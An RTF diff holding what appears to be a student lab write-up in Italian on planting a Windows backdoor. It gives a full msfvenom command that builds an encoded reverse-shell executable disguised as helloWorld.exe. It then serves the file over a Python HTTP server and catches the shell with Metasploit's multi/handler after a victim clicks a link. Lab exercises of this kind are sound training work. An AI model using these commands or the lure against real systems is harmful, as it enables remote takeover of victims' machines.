@@ -1,0 +1,56 @@
+{\rtf1\ansi\ansicpg1252\cocoartf2761
+\cocoatextscaling0\cocoaplatform0{\fonttbl\f0\fswiss\fcharset0 Helvetica;\f1\fswiss\fcharset0 Helvetica-Bold;}
+{\colortbl;\red255\green255\blue255;\red66\green66\blue66;\red255\green255\blue255;\red0\green0\blue0;
+\red255\green255\blue255;\red67\green67\blue66;}
+{\*\expandedcolortbl;;\cssrgb\c32941\c32941\c32941;\cssrgb\c100000\c100000\c100000;\cssrgb\c0\c0\c0;
+\cssrgb\c100000\c100000\c99971;\cssrgb\c33014\c33014\c32931;}
+\paperw11900\paperh16840\margl1440\margr1440\vieww20760\viewh11700\viewkind0
+\pard\tx720\tx1440\tx2160\tx2880\tx3600\tx4320\tx5040\tx5760\tx6480\tx7200\tx7920\tx8640\pardirnatural\partightenfactor0
+
+\f0\fs96 \cf0 SPIEGAZIONE BACKDOOR\
+
+\fs36 \
+Per iniettare la backdoor nel sistema windows ho cercato di farlo in un modo che possa il pi\'f9 possibile alla realt\'e0.\
+\
+1. Ho creato il payload con msf venom con il seguente comando ==> 
+\f1\b\fs32 \cf2 \cb3 \expnd0\expndtw0\kerning0
+msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST = 192.168.198.100 LPORT=4444 -b "\\x00" -e x86/shikata_ga_nai -f exe > helloWorld.exe.
+\f0\b0  \cf4 \cb5 \
+\pard\tx560\tx1120\tx1680\tx2240\tx2800\tx3360\tx3920\tx4480\tx5040\tx5600\tx6160\tx6720\pardirnatural\partightenfactor0
+
+\fs24 \cf0 \cb1 \kerning1\expnd0\expndtw0 {{\NeXTGraphic Screenshot 2024-04-22 alle 00.24.42.png \width38200 \height5220 \appleattachmentpadding0 \appleembedtype0 \appleaqc
+}¬}\
+\
+
+\fs36 Il seguente comando crea un payload chiamato helloWorld.exe  come impostazioni abbiamo dettato il local host ovvero il nostro indirizzo ip e la porta 4444 come porta di ascolto.\
+\
+2. Ho avviato un semplice server http con python con porta 8000 in modo tale da simulare che la vittima vada a visitare un sito infetto da noi inoltrato.\
+\pard\tx560\tx1120\tx1680\tx2240\tx2800\tx3360\tx3920\tx4480\tx5040\tx5600\tx6160\tx6720\pardirnatural\partightenfactor0
+
+\fs24 \cf0 {{\NeXTGraphic Screenshot 2024-04-22 alle 00.08.37.png \width21840 \height3540 \appleattachmentpadding0 \appleembedtype0 \appleaqc
+}¬}
+\fs36 \
+\
+3. Ho avviato msf console ed ho utilizzato l\'92exploit multi/handler e sono andato a dettare il payload che abbiamo creato, ho inserito il local host e la porta di ascolto (4444). Il seguente exploit avvia una reverse shell in attesa di connessione da parte della vittima.\
+Come facciamo ad ottenere la connessione? Semplice aspettiamo che la vittima clicchi sul nostro \'91link\'92 infetto e il gioco \'e8 fatto.\
+In questo caso il link \'e8: http://192.168.198.100 ovvero l\'92indirizzo del nostro server precedentemente avviato.\
+\pard\tx720\tx1440\tx2160\tx2880\tx3600\tx4320\tx5040\tx5760\tx6480\tx7200\tx7920\tx8640\pardirnatural\partightenfactor0
+
+\fs24 \cf0 {{\NeXTGraphic Screenshot 2024-04-22 alle 00.11.41.png \width31860 \height19300 \appleattachmentpadding0 \appleembedtype0 \appleaqc
+}¬}
+\fs36 \
+\
+4. Una volta che la vittima ciccher\'e0 sul nostro link baster\'e0 che clicchi sul link helloWorld.exe e saremo dentro.\
+\pard\tx720\tx1440\tx2160\tx2880\tx3600\tx4320\tx5040\tx5760\tx6480\tx7200\tx7920\tx8640\pardirnatural\partightenfactor0
+
+\fs24 \cf0 {{\NeXTGraphic Screenshot 2024-04-22 alle 00.14.46.png \width37320 \height1020 \appleattachmentpadding0 \appleembedtype0 \appleaqc
+}¬}\pard\tx720\tx1440\tx2160\tx2880\tx3600\tx4320\tx5040\tx5760\tx6480\tx7200\tx7920\tx8640\pardirnatural\partightenfactor0
+
+\fs36 \cf0 \
+\pard\tx720\tx1440\tx2160\tx2880\tx3600\tx4320\tx5040\tx5760\tx6480\tx7200\tx7920\tx8640\pardirnatural\partightenfactor0
+
+\fs24 \cf0 {{\NeXTGraphic Screenshot 2024-04-22 alle 00.15.23.png \width29240 \height13620 \appleattachmentpadding0 \appleembedtype0 \appleaqc
+}¬}\pard\tx720\tx1440\tx2160\tx2880\tx3600\tx4320\tx5040\tx5760\tx6480\tx7200\tx7920\tx8640\pardirnatural\partightenfactor0
+
+\fs36 \cf0 \
+}
